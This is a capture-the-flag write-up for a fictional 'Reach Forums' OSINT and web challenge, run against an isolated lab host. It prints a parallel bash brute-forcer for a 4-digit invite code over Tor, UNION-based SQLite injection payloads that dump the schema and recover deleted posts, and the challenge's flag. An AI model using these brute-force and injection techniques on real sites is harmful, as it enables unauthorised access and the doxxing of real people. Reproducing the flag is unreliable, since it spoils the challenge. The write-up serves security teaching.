# Reach Forums — OSINT / Web Writeup

**Event:** BCS CTF
**Category:** OSINT + Web
**Flag:** `bcsctf{3c_Kalindi_Tower_Dhaka_Bangladesh}`

---

## Brief

> Our intelligence team is monitoring an illicit organization called **Reach Forums**.
> They cycle through darkweb mirrors, but we found a clearweb page they use to broadcast
> their active onion links. Analyze the starting point and extract data that could expose
> the identity of a Reach Forums admin. Once you locate a physical address, submit it as
> `bcsctf{Physical_Address}` — delete all commas and replace spaces with underscores.
>
> Start: `http://172.16.38.22:8888`

---

## TL;DR

1. Clearweb page announces the live onion mirror.
2. Reach the onion over Tor; it's an invite-only Flask forum.
3. Brute-force the 4-digit invite code (`0777`) to register.
4. Forum guidelines reveal an "AI redacts staff PII" mechanic; a seller's post was taken down.
5. `/thread/<id>` is a numeric **SQL injection** (SQLite). Dump the schema.
6. There's no `hidden` column — redacted originals live in a **`removed_posts`** table.
7. Recover the seller's original post → it embeds a "proof" screenshot URL.
8. Download the screenshot → an unsanitized order summary leaks the physical address.

---

## 1. The starting point (clearweb)

```
$ curl -s http://172.16.38.22:8888/
<h1>Reach Forums</h1>
<h3>Our Previous Mirror (reached4lhlibrqmzj7h2n4unu7wdzkg7gczcggufbqufwmefhdbkrd9.onion)
    was shutdown
    Here is our working darkweb mirror:
    http://scxyokpjskaeufbggynttrrt4bm47qopdwez3v7cef4auwkqah77slad.onion</h3>
<b>Remember we don't have any clearnet mirror. all of them are fake.</b>
```

Two v3 onion addresses:

| State    | Address |
|----------|---------|
| Old (dead) | `reached4lhlibrqmzj7h2n4unu7wdzkg7gczcggufbqufwmefhdbkrd9.onion` |
| **Live**   | `scxyokpjskaeufbggynttrrt4bm47qopdwez3v7cef4auwkqah77slad.onion` |

## 2. Reaching the onion

Tor2web gateways are all dead in 2026, so run a local Tor SOCKS proxy. No sudo was
available, but Docker was, so:

```bash
docker run -d --name torproxy -p 127.0.0.1:9050:9050 dperson/torproxy:latest
# wait for "Bootstrapped 100%"
curl -s -x socks5h://127.0.0.1:9050 \
  http://scxyokpjskaeufbggynttrrt4bm47qopdwez3v7cef4auwkqah77slad.onion/
```

The site is a Flask app (Werkzeug) that redirects everything to `/login`. It's
invite-only, but `/register` exists and asks for a **4-digit invitation code**
(`<input name="invite" maxlength="4" placeholder="1234">`).

## 3. Brute-forcing the invite code

Only 10,000 possibilities. Two distinct failure messages give a clean oracle:

- Wrong 4-digit value → `Invitation code rejected.`
- Malformed length → `Invalid invitation code.`

A successful registration instead returns `302 -> /login`. Brute-force anything that is
**neither** error message:

```bash
ONION=scxyokpjskaeufbggynttrrt4bm47qopdwez3v7cef4auwkqah77slad.onion
brute(){
  code=$1
  r=$(curl -s -x socks5h://127.0.0.1:9050 -i \
        -X POST -d "username=reg_$code&password=Pw!23456&invite=$code" \
        http://$ONION/register)
  echo "$r" | grep -qE "Invitation code rejected\.|Invalid invitation code\." || echo "HIT $code"
}
export -f brute
seq -w 0000 9999 | xargs -P 40 -I{} bash -c 'brute {}'
```

**Hit: invite code `0777`.** Register, then log in — you land in `/forum`.

## 4. Reading the board

The seeded threads (all timestamped `...05:08:05`) matter; everything later is noise from
other players. Key content:

- **Thread 1 — Guidelines (`sysadmin`):**
  > "We use an automated AI system that redacts posts from staff if it suspects PII leakage."

  (The P.S. about merging worldometers flag `.webp` files is a **red herring**.)

- **Thread 3 — Security mistakes:** *"Never use real addresses near you as 'dummy data' in
  screenshots"* / *"sellers dox their own country from unblurred 'sample order' pics."* — a
  direct nudge toward the answer.

- **Thread 5 — `[WTS] Exclusive e-commerce bypass` (`magstripe`):** the seller's first post is
  replaced with *"This post has been taken down due to potential policy violations."* Replies:
  > *"reverse-engineer that with less information"*
  > *"The HTML formatting on your post is messed up."*
  > *"If you don't know how to inspect network traffic, don't bother."*

So a staff member (`magstripe`) leaked PII, the AI removed the post, and we need the original.

## 5. SQL injection in `/thread/<id>`

`/thread/<id>` interpolates the id straight into SQLite (no cast):

| Input | Result |
|-------|--------|
| `5'`  | 302 (SQL error → redirect) |
| `1e0` | thread 1 (float literal `1.0` matches id 1) → confirms numeric string-interpolation |
| `0 UNION SELECT ...` | injectable |

The thread query has **5 columns**; col 2 renders as the page title. Dump the schema:

```
/thread/0 UNION SELECT 1,(SELECT group_concat(sql,' | ') FROM sqlite_master),3,4,5
```

Schema:

```sql
users(id, username, password_hash, created_at)
threads(id, title, author_id, created_at)
posts(id, thread_id, author_id, body, created_at)
removed_posts(id, thread_id, author_id, body, created_at)   -- <-- the prize
```

There is **no `hidden` column** (other players guessing `WHERE hidden=1` were on a dead end).
Redacted originals are moved to **`removed_posts`**.

## 6. Recovering the removed post

```
/thread/0 UNION SELECT 1,
  (SELECT group_concat(u.username||' | '||r.body,' ##### ')
     FROM removed_posts r JOIN users u ON u.id=r.author_id),
  3,4,5
```

`magstripe`'s original post comes back in full. It contains the un-sanitized "proof":

```
Here is a sanitized snippet from my last successful run:
<img src="http://reached4lhlibrqmzj7h2n4unu7wdzkg7gczcggufbqufwmefhdbkrd9.onion/
          images/60331f1fcbf9b44c3712c2efa87e81558a62b997.png">
```

The image is on the *old* (dead) mirror, but the same `/images/<sha1>.png` path is still
served by the live mirror.

## 7. The screenshot

```bash
curl -s -x socks5h://127.0.0.1:9050 \
  http://scxyokpjskaeufbggynttrrt4bm47qopdwez3v7cef4auwkqah77slad.onion/images/60331f1fcbf9b44c3712c2efa87e81558a62b997.png \
  -o shot.png
```

It's a Kali terminal "proof-of-concept" showing a payment-bypass order summary. No blur:

```
Gateway: TLS-COMMERZ                         # ~ SSLCOMMERZ (the "modified gateway name")
Billing name:  John
Billing email: card1ng.exp@protonmail.me
Shipping address: 3c, Kalindi Tower, Dhaka, Bangladesh
```

## 8. The flag

Physical address: `3c, Kalindi Tower, Dhaka, Bangladesh`
→ remove commas → `3c Kalindi Tower Dhaka Bangladesh`
→ spaces to underscores:

```
bcsctf{3c_Kalindi_Tower_Dhaka_Bangladesh}
```

---

## Rabbit holes / notes

- **Worldometers flags P.S.** in thread 1 — pure distraction.
- **`WHERE hidden=1`** — no such column; the redacted data is in `removed_posts`.
- Thread 13's `123 Example Street` and the many `admin`/`test` posts are other players' noise,
  not seeded content.
- Everything ran against the isolated CTF lab (RFC 1918 `172.16.38.22`, `bcsctf{}` format);
  "Reach Forums," `magstripe`, and the leaked address are the challenge's fiction.

## Tools used

`curl` + SOCKS5, `dperson/torproxy` (Docker) for Tor, a small bash brute-forcer, and
UNION-based SQLi.
